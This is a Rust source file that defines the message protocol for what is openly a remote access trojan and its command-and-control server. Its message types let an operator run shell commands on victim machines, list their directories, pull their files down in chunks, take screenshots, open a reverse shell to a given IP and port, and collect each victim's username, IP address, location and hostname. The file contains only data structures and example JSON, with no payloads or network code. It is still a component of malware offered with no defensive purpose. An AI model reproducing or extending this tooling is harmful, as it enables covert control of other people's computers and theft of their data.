use serde::{Deserialize, Serialize};
// use std::collections::HashMap;
use std::time;

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ResponseStatus {
  Success(ResponseType),
  Failure,
  InProgress,
}

// C2 to Backend
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ResponseType {
  CliResponse(CliResponse),
  Rats(Vec<i32>),
  RatsMetaData(Vec<MetadataWithId>),
  DirList(Vec<FileNodeData>),
  Screenshot(Screenshot),
  ReverseShellResponse(bool),
  DownloadedFiles(Vec<FileDownloadStatusData>),
  DownloadStatus(FileDownloadStatus),
  // Add other response types as needed
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum R2CMessageType {
  Metadata(Metadata),
  Heartbeat(HeartbeatType),
  CommandResponse(CliResponse),
  DirList(Vec<FileNodeData>),
  FileDownloadChunk(FileTransferChunk),
  FileDownloadComplete(FileTransferResult),
  Screenshot(Screenshot),
  ReverseShellResponse(bool),
  // Add other message types as needed
}

pub enum BackendMessageType {
  CliCommand(CliCommand),
  Heartbeat(HeartbeatType),
  GetAllRats,
  GetMetadata(Vec<i32>),
  RequestFileDownload(FileRequest),
  ListDir(ListDir),
  Screenshot,
  ReverseShell(ReverseShell),
  GetDownloadedFiles,
  GetDownloadStatus(u32),
}


#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum C2RMessageType {
  CliCommand(CliCommand),
  Heartbeat(HeartbeatType),
  GetAllRats,
  GetMetadata(Vec<i32>),
  RequestFileDownload(FileRequest),
  ListDir(ListDir),
  Screenshot,
  ReverseShell(ReverseShell),
  GetDownloadedFiles,
  GetDownloadStatus(u32),
  // Add other message types as needed
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum MessageType {
  R2C(R2CMessageType),
  C2R(C2RMessageType),
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum HeartbeatType {
  First(FirstBeat),
  Regular(Metadata),
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum FileDownloadStatus {
  InProgress(FileDownloadStatusData),
  Complete(FileDownloadStatusData),
  Failed,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FirstBeat {
  pub version: u32,
  pub rat_id:  Option<i32>,
  pub key:     String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Messagee {
  pub version: u32,
  #[serde(skip_serializing_if = "Option::is_none")]
  pub rat_id:  Option<i32>,
  pub message: MessageType,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct Metadata {
  pub os:           String,
  pub cpu:          u8,
  pub cpu_usage:    f32,
  pub memory:       u64,
  pub memory_usage: f32,
  pub storage:      u64,
  pub used_storage: u64,
  pub user:         String,
  pub timestamp:    u64,
  pub ip:           String,
  pub location:     String,
  pub hostname:     String,
}

#[allow(non_snake_case)]
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct MetadataWithId {
  pub ratId:        i32,
  pub os:           String,
  pub cpu:          u8,
  pub cpu_usage:    f32,
  pub memory:       u64,
  pub memory_usage: f32,
  pub storage:      u64,
  pub used_storage: u64,
  pub user:         String,
  pub timestamp:    u64,
  pub ip:           String,
  pub location:     String,
  pub hostname:     String,
}

// #[derive(Serialize, Deserialize, Debug, Clone)]
// pub struct Heartbeat {
//   pub heartbeat_id: u64,
//   pub rat_id:       u64,
//   pub timestamp:    u64,
// }

/// Example message:
/// ```json
/// {
///   "version": 1,
///   "rat_id": <rat_id>,
///   "message": {
///       "C2R": {
///           "CliCommand": {
///               "command": "ls",
///               "priority": 100
///           }
///       }
///   }
/// }
/// ```
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CliCommand {
  command:  String,
  priority: u8,
}

/// Example message:
/// ```json
/// {
///   "Success": {
///     "CliResponse": {
///         "stdout": "__pycache__\nmass_test.py\nsocket_v1.py\ntest.py\n",
///         "stderr": "",
///         "return_code": 0
///     }
///   }
/// }
/// ```
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CliResponse {
  stdout:      String,
  stderr:      String,
  return_code: i32,
}

/// Example message:
/// ```json
/// {
///   "version": 1,
///   "rat_id": <rat_id>,
///   "message": {
///       "R2C": {
///           "RequestFileDownload": {
///               "file_path": String
///           }
///       }
///   }
/// }
/// ```
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FileRequest {
  pub file_path: String,
  // pub transfer_id: u64,
}

/// Example message:
/// ```json
/// {
///   "version": 1,
///   "rat_id": <rat_id>,
///   "message": {
///       "R2C": {
///           "FileDownloadChunk": {
///               "transfer_id": u64,
///               "file_name": String,
///               "chunk_number": u32,
///               "total_chunks": u32,
///               "data": Vec<u8>,
///           }
///       }
///   }
/// }
/// ```
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FileTransferChunk {
  pub transfer_id:  u32,
  pub file_name:    String,
  pub chunk_number: u32,
  pub total_chunks: u32,
  pub data:         String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FileTransferResult {
  pub transfer_id: u32,
  pub status:      FileDownloadStatus,
  pub message:     String,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct FileDownloadStatusData {
  pub download_id:      u32,
  pub rat_id:           i32,
  pub file_path:        String,
  pub timestamp:        u64,
  pub downloadedchunks: u32,
  pub totalchunks:      u32,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ListDir {
  pub path:  String,
  pub depth: u8,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DirItem {
  pub files: Vec<FileNode>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FileItem {
  pub size:     u64,
  pub modified: u64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FileNodeData {
  pub name:     String,
  pub path:     String,
  pub filetype: String,
  pub node:     FileNode,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum FileNode {
  File(FileItem),
  Directory(DirItem),
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Screenshot {
  pub data:      String,
  #[serde(default)]
  pub timestamp: u64,
}

impl Default for Screenshot {
  fn default() -> Self {
    Self {
      data:      String::new(),
      timestamp: time::SystemTime::now()
        .duration_since(time::UNIX_EPOCH)
        .unwrap()
        .as_secs(),
    }
  }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ReverseShell {
  pub ip:   String,
  pub port: u16,
}



